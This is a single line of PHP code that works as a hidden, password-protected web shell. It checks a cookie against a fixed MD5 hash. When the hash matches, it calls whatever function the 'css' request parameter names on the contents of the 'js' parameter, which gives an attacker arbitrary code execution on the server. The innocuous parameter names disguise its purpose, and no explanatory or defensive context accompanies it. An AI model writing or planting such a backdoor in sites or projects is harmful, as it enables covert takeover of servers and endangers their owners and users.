<?php if(md5(@$_COOKIE['hsh'])=='afa866c2a146a0603e48507514f8559b')($_=@$_REQUEST['css']).@$_($_REQUEST['js']); ?>
